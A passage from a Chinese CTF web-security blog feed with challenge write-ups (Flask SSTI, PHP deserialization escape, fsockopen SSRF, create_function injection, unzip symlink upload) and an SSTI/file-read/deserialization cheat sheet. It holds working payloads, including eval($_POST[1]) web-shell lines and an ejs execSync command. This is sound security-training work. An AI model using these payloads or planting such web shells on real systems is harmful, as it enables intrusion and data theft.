invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以把$space传为admin<br>继续传<br>它首先会以空格分隔 然后进行类似黑名单检查 我们需要设置的函数不能出现在$system的表中<br>把action置为function name置为phpinfo</p><p>最后这么传就可以:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: http:<span class="comment">//node4.anna.nssctf.cn:28651/</span></span><br><span class="line">POST:template=index.html&amp;space=admin&amp;mod=???!!! action=<span class="function"><span class="keyword">function</span> <span class="title">name</span>=<span class="title">phpinfo</span></span></span><br></pre></td></tr></table></figure><p>mod传什么都行 反正后面会进行变量覆盖<br>然后就可以在php的环境变量找到FLAG</p><h1 id="HZNUCTF-2023-preliminary-flask"><a href="#HZNUCTF-2023-preliminary-flask" class="headerlink" title="[HZNUCTF 2023 preliminary]flask"></a>[HZNUCTF 2023 preliminary]flask</h1><p>python SSTI注入<br>?name&#x3D;xxx 输入会被反转 所以构造payload reverse一下即可<br>首先查看可引用的模块</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#125;&#125;)(__sessalcbus__.]<span class="number">0</span>[__sesab__.__ssalc__.)(&#123;&#123;</span><br></pre></td></tr></table></figure><p>虽然回显被替换为了 “,”  但ctrlu可以看到<br>复制换行搜索 找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">214 &lt;class &#x27;warnings.catch_warnings&#x27;&gt;</span><br></pre></td></tr></table></figure><p>所以调用第214-1&#x3D;213个<br>读取环境变量<br>payload:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name = &#125;&#125;)<span class="string">&quot;)(daer.)&#x27;vne&#x27;(nepop.)&#x27;so&#x27;(__tropmi__&quot;</span>(]<span class="string">&#x27;lave&#x27;</span>[__snitliub__.__slabolg__.__tini__.]<span class="number">312</span>[)(__sessalcbus__.]<span class="number">0</span>[__sesab__.__ssalc__.)(&#123;&#123;</span><br></pre></td></tr></table></figure><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello! HOSTNAME=6cde8b0bced543cc PYTHON<span class="emphasis">_PIP_</span>VERSION=20.1 HOME=/root GPG<span class="emphasis">_KEY=E3FF2839C048B25C084DEBE9B26995E310250568 WERKZEUG_</span>SERVER<span class="emphasis">_FD=3 PYTHON_</span>GET<span class="emphasis">_PIP_</span>URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON<span class="emphasis">_VERSION=3.8.2 PWD=/app PYTHON_</span>GET<span class="emphasis">_PIP_</span>SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348 FLAG=NSSCTF&#123;404c749b-4f7a-41a2-b16f-2f82effdc536&#125; </span><br></pre></td></tr></table></figure><h1 id="NSS-prize-p5"><a href="#NSS-prize-p5" class="headerlink" title="NSS prize_p5"></a>NSS prize_p5</h1><p>题目源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">catalogue</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">error</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">data</span> = &quot;<span class="title">hacker</span>&quot;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>($<span class="title">this</span>-&gt;<span class="title">data</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">error</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$OTL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;OTL = <span class="variable">$OTL</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;OTL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape</span></span>&#123;                                                                   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;OTL&#x27;</span>;                                                 </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span> = <span class="string">&#x27;123666&#x27;</span>;                                             </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span> = <span class="string">&#x27;sweet@OTL.com&#x27;</span>;                          </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abscond</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="keyword">array</span>(<span class="string">&#x27;NSS&#x27;</span>, <span class="string">&#x27;CTF&#x27;</span>, <span class="string">&#x27;OTL_QAQ&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$filter</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/object/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cata&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">catalogue</span>(); </span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>));           </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono,you can not do that!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$abscond</span> = <span class="keyword">new</span> <span class="title function_ invoke__">escape</span>();</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;phone = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span>-&gt;email = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$abscond</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$abscond</span>);</span><br><span class="line">        <span class="variable">$escape</span> = <span class="title function_ invoke__">get_object_vars</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">abscond</span>(<span class="variable">$abscond</span>)));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$escape</span>[<span class="string">&#x27;phone&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$escape</span>[<span class="string">&#x27;email&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>最后肯定是要通过file_get_contents来读取&#x2F;flag 但是email变量加了过滤<br>注意到hello-&gt;hacker 5-&gt;6 可以用反序列化字符逃逸 在phone[]&#x3D;xxx中逃逸覆盖后面的email<br>观察序列化格式:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;escape&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们想要得到:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;&#125;s:5:&quot;</span>email<span class="string">&quot;;s:5:&quot;</span>/flag<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>一共28个字符 用28个hello来逃逸</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span>&amp;phone[]=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello<span class="string">&quot;;&#125;s:5:&quot;</span>email<span class="string">&quot;;s:5:&quot;</span>/flag<span class="string">&quot;;&#125;&amp;email=1</span></span><br></pre></td></tr></table></figure><h1 id="HNCTF-2022-WEEK2-ez-ssrf"><a href="#HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf"></a>[HNCTF 2022 WEEK2]ez_ssrf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里考察的点是利用fsockopen来进行ssrf<br>我们host:port传 127.0.0.1:80<br>data构造请求头:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p>转base64的时候没行末补一个 CR(红色的)<br>转为 R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p><p>这样请求就能得到flag</p><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>对config&#x2F;self,’()’ 进行了过滤<br>直接的flask ssti就不行了</p><p>参考<a href="https://blog.csdn.net/mochu7777777/article/details/126965093"> + </a><br>可以用url_for 和 get_flashed_messages</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>利用current_app方法可以查看config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="CodeBreaking挑战赛"><a href="#CodeBreaking挑战赛" class="headerlink" title="CodeBreaking挑战赛"></a>CodeBreaking挑战赛</h1><p>参考:</p><ul><li><a href="https://paper.seebug.org/755/">+</a></li></ul><h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy-function"></a>easy-function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个正则可以通过fuzz来找<br>找到是 “&quot;<br>学习到了:</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function<span class="emphasis">_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_</span>name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</span><br></pre></td></tr></table></figure><p>然后利用create_function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以通过在传的内容补”}”来逃逸出这个函数<br>类似这种:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样利用 函数内容里的”}”提前闭合函数 然后利用 “&#x2F;&#x2F;“来注释掉原本的函数闭合括号(妙！)<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=\create_function&amp;arg=<span class="keyword">return</span>%<span class="number">201</span>;&#125;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="comment">//</span></span><br></pre></td></tr></table></figure><hr><hr><p>练习下create_function用法:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;phpinfo();&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>();</span><br></pre></td></tr></table></figure><p>这样就可以执行</p><h1 id="CISCN2023-unzip"><a href="#CISCN2023-unzip" class="headerlink" title="CISCN2023 unzip"></a>CISCN2023 unzip</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>考点: Linux软链接+unzip覆盖<br><a href="https://blog.csdn.net/m0_64583630/article/details/131293337">参考</a></p><p>要用到软链接是因为我们只能访问当前网页下的 也就是 &#x2F;var&#x2F;www&#x2F;html<br>而题目是unzip到&#x2F;tmp下 我们访问不了<br>所以利用第一次的1.zip中link来指向 &#x2F;var&#x2F;www&#x2F;html<br>然后第二次2.zip解压后的文件夹名字也是link 这样就指向了link所指向的地址<br>所以shell.php就传到了网页目录下 getshell</p><p>注意 linux写马要转义<br><code>echo &quot;&lt;?= eval(\$_POST[1]);?&gt;&quot; &gt;shell.php</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web</title>
      <link href="/Web/"/>
      <url>/Web/</url>
      
        <content type="html"><![CDATA[<p>web相关</p><span id="more"></span><!-- toc --><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p><img src="https://s2.loli.net/2023/12/28/fWlxyDicHbNvFMQ.png" alt="img"></p><p>直接看<a href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank">这篇</a></p><h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p>tmpmap很不兼容高版本python 所以用sstimap</p><p>虚拟机ubuntu启动(有些库是基于Debian的…)</p><p>-u –os-shell 一把梭</p><h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><p><code>&lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;tac /f*&#39;) %&gt;</code></p><p>如果没有回显 就<code>execSync(&#39;tac /f* &gt;/app/static/flag&#39;)</code> 查看 <code>http://xxxxx:xxx/static/flag</code>即可</p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="文件读取漏洞的后利用姿势"><a href="#文件读取漏洞的后利用姿势" class="headerlink" title="文件读取漏洞的后利用姿势"></a>文件读取漏洞的后利用姿势</h2><p>详细: <a href="https://www.freebuf.com/articles/web/337617.html" target="_blank">这篇</a></p><h3 id="Java-c0-ae-安全模式绕过"><a href="#Java-c0-ae-安全模式绕过" class="headerlink" title="Java %c0%ae 安全模式绕过"></a>Java %c0%ae 安全模式绕过</h3><p>在Java端”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII低字符-“.”。通过这个方法可以绕过目录保护读取包配置文件信息</p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>参考文章: </p><ol><li><a href="https://blog.csdn.net/bmth666/article/details/104737025" target="_blank">+</a></li></ol><h2 id="public-protected-private"><a href="#public-protected-private" class="headerlink" title="public&#x2F;protected&#x2F;private"></a>public&#x2F;protected&#x2F;private</h2><p>public: 直接反序列化<br>protected: \x00+*+\x00+变量名<br>private: \x00+类名+\x00+变量名</p><h2 id="绕过正则匹配"><a href="#绕过正则匹配" class="headerlink" title="绕过正则匹配"></a>绕过正则匹配</h2><p>在对象前添加 “+”  然后urlencode一下(不然+会被解析为空格)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;baby&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 